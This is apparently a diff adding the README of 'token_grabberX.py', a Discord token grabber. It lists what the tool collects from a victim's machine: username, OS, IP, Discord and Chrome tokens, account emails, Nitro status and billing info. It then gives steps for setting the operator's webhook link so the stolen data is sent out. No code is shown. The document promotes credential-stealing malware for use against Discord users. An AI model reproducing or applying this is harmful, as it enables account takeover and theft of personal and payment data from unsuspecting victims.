@@ -1,0 +1,13 @@
+- Computer UserName
+- OS
+- IP
+- Token from the discord app
+- Token from google chrome
+- Mail from each discord account
+- If it's a nitro activated on the discord account
+- If there are Billing Info on the discord account
+How to use
+- 1.Open the "token_grabberX.py"
+- 2.Scroll down
+- 3.Change the "YOUR WEEBHOOK LINK HERE" with your weebhook
+- 4.Done
